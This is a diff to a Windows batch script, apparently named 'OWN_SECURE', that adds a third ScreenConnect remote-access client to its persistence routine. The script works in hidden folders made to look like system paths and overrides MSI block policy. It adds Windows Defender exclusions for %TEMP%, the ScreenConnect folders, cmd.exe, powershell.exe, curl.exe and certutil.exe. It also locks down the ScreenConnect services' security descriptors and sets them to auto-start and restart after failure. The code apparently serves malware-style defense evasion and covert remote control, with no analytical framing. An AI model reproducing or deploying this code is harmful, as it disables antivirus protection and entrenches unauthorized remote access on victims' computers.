@@ -1,20 +1,22 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S6 - identity-aware task ACL + DisableMSI neutralize + exclusions/ACL; no attr-lock on mutable payloads
+REM OWN_SECURE BUILD 20260802S7 - gryxa keep + identity-aware task ACL + DisableMSI neutralize + exclusions/ACL; no attr-lock on mutable payloads
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
 set "PRIM=ScreenConnect Client (5f6010579852e507)"
 set "ALT=ScreenConnect Client (f861c8140d453427)"
+set "GRYXA=ScreenConnect Client (9908198e668e4750)"
 set "KEEP1=5f6010579852e507"
 set "KEEP2=f861c8140d453427"
+set "KEEP3=9908198e668e4750"
 set "PF=%ProgramFiles%"
 set "PF86=%ProgramFiles(x86)%"
 set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S6>>"%LOG%"
+echo secure_begin %DATE% %TIME% S7>>"%LOG%"
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
@@ -35,8 +37,10 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windo
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP3%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP3%)" /t REG_DWORD /d 0 /f >nul 2>&1
 for %%P in (msiexec.exe curl.exe cmd.exe powershell.exe certutil.exe ScreenConnect.ClientService.exe ScreenConnect.WindowsClient.exe) do (
   reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%P" /t REG_DWORD /d 0 /f >nul 2>&1
 )
@@ -82,8 +86,10 @@ if not exist "%WD%\secure_sc.flag" (
   for %%D in (
     "%PF%\ScreenConnect Client (%KEEP1%)"
     "%PF%\ScreenConnect Client (%KEEP2%)"
+    "%PF%\ScreenConnect Client (%KEEP3%)"
     "%PF86%\ScreenConnect Client (%KEEP1%)"
     "%PF86%\ScreenConnect Client (%KEEP2%)"
+    "%PF86%\ScreenConnect Client (%KEEP3%)"
   ) do (
     if exist "%%~D" call :LockDir "%%~D"
   )
@@ -95,10 +101,13 @@ REM SY: CC DC LC SW RP DT LO RC  (no SD -> cannot change this SD itself)
 set "SD=D:(A;;CCDCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc.exe sdset "%PRIM%" "%SD%" >nul 2>&1
 sc.exe sdset "%ALT%" "%SD%" >nul 2>&1
+sc.exe sdset "%GRYXA%" "%SD%" >nul 2>&1
 sc.exe config "%PRIM%" start= auto >nul 2>&1
 sc.exe config "%ALT%" start= auto >nul 2>&1
+sc.exe config "%GRYXA%" start= auto >nul 2>&1
 sc.exe failure "%PRIM%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
 sc.exe failure "%ALT%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
+sc.exe failure "%GRYXA%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
 
 echo secure_done>>"%LOG%"
 exit /b 0
